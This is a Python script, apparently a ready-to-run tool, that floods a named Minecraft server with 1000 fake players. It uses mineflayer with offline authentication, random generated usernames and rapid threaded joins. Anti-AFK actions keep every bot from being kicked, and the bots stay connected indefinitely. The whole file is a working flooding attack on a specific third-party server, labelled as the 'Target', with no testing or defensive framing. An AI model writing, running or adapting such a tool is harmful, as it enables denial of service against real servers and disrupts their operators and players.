# bot.py - Mass Bot Joining System
import time
import threading
import random
from javascript import require
from mcstatus import JavaServer

mineflayer = require('mineflayer')

# ============================================
# ⚙️ CONFIGURATION
# ============================================
SERVER_IP = "pl.pvpmc.qzz.io"
SERVER_PORT = 25565
BOT_COUNT = 1000

# Name lists for random names
NAMES = [
    "Diamond", "Creeper", "Steve", "Alex", "Herobrine",
    "Notch", "Jeb", "Dream", "Techno", "Gamer",
    "Noob", "Pro", "PvP", "Legend", "Warrior",
    "Shadow", "Hunter", "Fighter", "Beast", "Titan",
    "Star", "King", "Queen", "Lord", "Ghost",
    "Blaze", "Wither", "Dragon", "Phoenix", "Knight",
    "Sniper", "Sage", "Viper", "Wolf", "Hawk",
    "Tiger", "Lion", "Eagle", "Falcon", "Strike",
    "Beast", "Boss", "Champ", "Hero", "Viking",
    "Demon", "Angel", "Guardian", "Wizard", "Elite"
]

SUFFIXES = ["YT", "TV", "MC", "XD", "OP", "Pro", "Noob"]

# ============================================
# 📝 NAME GENERATOR
# ============================================
def generate_name(bot_id):
    """Generate random unique name"""
    name = random.choice(NAMES)
    
    # Add number or suffix
    if random.choice([True, False]):
        name += str(random.randint(1, 9999))
    else:
        name += random.choice(SUFFIXES)
    
    # Ensure unique (add bot_id if duplicate)
    return f"{name}_{bot_id}"

# ============================================
# 🤖 BOT CREATOR
# ============================================
def create_bot(bot_id):
    """Create a single bot"""
    try:
        username = generate_name(bot_id)
        
        bot = mineflayer.createBot({
            'host': SERVER_IP,
            'port': SERVER_PORT,
            'username': username,
            'version': '1.20.4',
            'auth': 'offline'
        })
        
        bot.on('login', lambda: print(f'✅ {username} joined!'))
        bot.on('error', lambda err: print(f'❌ {username} error: {err}'))
        bot.on('end', lambda reason: print(f'🚪 {username} left: {reason}'))
        
        bot.on('spawn', lambda: anti_afk(bot, username))
        bot.on('kicked', lambda reason: print(f'👢 {username} kicked: {reason}'))
        
        return bot
        
    except Exception as e:
        print(f'❌ Failed to create bot {bot_id}: {e}')
        return None

# ============================================
# 🛡️ ANTI-AFK SYSTEM
# ============================================
def anti_afk(bot, username):
    """Prevent AFK kick with random actions"""
    import random
    
    def do_action():
        actions = ['jump', 'sneak', 'look', 'swing']
        action = random.choice(actions)
        
        try:
            if action == 'jump':
                bot.setControlState('jump', True)
                time.sleep(0.2)
                bot.setControlState('jump', False)
            elif action == 'sneak':
                bot.setControlState('sneak', True)
                time.sleep(1)
                bot.setControlState('sneak', False)
            elif action == 'look':
                bot.look(random.uniform(-180, 180), random.uniform(-90, 90))
            elif action == 'swing':
                bot.swingArm('main')
        except:
            pass
    
    while True:
        time.sleep(random.randint(20, 60))
        try:
            do_action()
            print(f'💤 {username} anti-afk action')
        except:
            pass

# ============================================
# 🚀 MASS JOIN FUNCTION
# ============================================
def mass_join():
    """Join 1000+ bots to the server"""
    print(f'🚀 Starting mass join: {BOT_COUNT} bots to {SERVER_IP}')
    print(f'📝 Using {len(NAMES)} name templates')
    print('=' * 50)
    
    # Check server
    try:
        server = JavaServer.lookup(f"{SERVER_IP}:{SERVER_PORT}")
        status = server.status()
        print(f'📊 Server: {status.players.online}/{status.players.max} players online')
    except:
        print('⚠️ Server not reachable, still trying...')
    
    print('=' * 50)
    
    # Create bots
    threads = []
    bots_created = 0
    
    for i in range(BOT_COUNT):
        t = threading.Thread(target=create_bot, args=(i,))
        t.start()
        threads.append(t)
        bots_created += 1
        
        # Fast join (0.2-0.5 second delay)
        time.sleep(random.uniform(0.2, 0.5))
        
        # Progress update
        if (i + 1) % 100 == 0:
            print(f'📊 Progress: {i+1}/{BOT_COUNT} bots created')
    
    print('=' * 50)
    print(f'✅ All {bots_created} bots created!')
    print(f'🔄 Keeping {BOT_COUNT} bots active...')
    print('=' * 50)
    
    # Keep running
    while True:
        time.sleep(60)
        print(f'🔄 {BOT_COUNT} bots still active...')

# ============================================
# 🔥 CUSTOM BOT WITH SPECIFIC NAME
# ============================================
def custom_bot(name):
    """Create a bot with custom name"""
    try:
        bot = mineflayer.createBot({
            'host': SERVER_IP,
            'port': SERVER_PORT,
            'username': name,
            'version': '1.20.4',
            'auth': 'offline'
        })
        print(f'✅ Custom bot "{name}" created!')
        return bot
    except Exception as e:
        print(f'❌ Failed to create "{name}": {e}')
        return None

# ============================================
# 📋 NAME LISTS
# ============================================
if __name__ == "__main__":
    print('=' * 50)
    print('🔥 MASS BOT JOINER')
    print('=' * 50)
    print(f'🎯 Target: {SERVER_IP}:{SERVER_PORT}')
    print(f'📊 Bots: {BOT_COUNT}')
    print(f'📝 Names: {len(NAMES)} templates')
    print('=' * 50)
    
    # Start mass join
    mass_join()
